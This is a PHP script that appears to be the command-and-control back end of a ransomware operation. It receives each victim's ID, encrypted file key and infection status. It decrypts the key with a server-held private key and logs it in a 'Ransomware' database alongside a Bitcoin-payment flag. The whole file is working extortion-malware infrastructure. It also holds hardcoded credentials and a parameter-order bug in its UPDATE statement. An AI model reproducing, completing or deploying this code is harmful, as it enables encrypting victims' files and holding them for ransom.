<?php
  $servername = "localhost";
  $username = "ziog";
  $password = "admin";
  $db = "Ransomware";

  $conn = new mysqli($servername, $username, $password, $db);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }
  $guid = $conn -> real_escape_string($_POST["guid"]);
  $ext = $conn -> real_escape_string($_POST["ext"]);
  $eKey64 = $conn -> real_escape_string($_POST["eKey64"]);
  $status = $conn -> real_escape_string($_POST["status"]);
  $res = $conn -> real_escape_string($_POST["res"]);

  if(empty($status)){
    $res = openssl_pkey_get_private("file://private.pem", "admin");
    openssl_private_decrypt(base64_decode($eKey64), $key, $res);

    $stmt = $conn->prepare("INSERT INTO Data (guid, ext, `key`, btc_paid) VALUES (?, ?, ?, 0)");
    $stmt->bind_param("sss", $guid, $ext, trim($key));
    $stmt->execute();
  }
  else{
    $infected_date = date("d/m/Y H:i:s");
    $stmt = $conn->prepare("UPDATE Data SET status = ?, res = ?, infected_date = ? WHERE guid LIKE ?");
    $stmt->bind_param("ssss", $status, $res, $guid, $infected_date);
    $stmt->execute();
  }

  $stmt->close();
  $conn->close();
  echo "ok";
?>
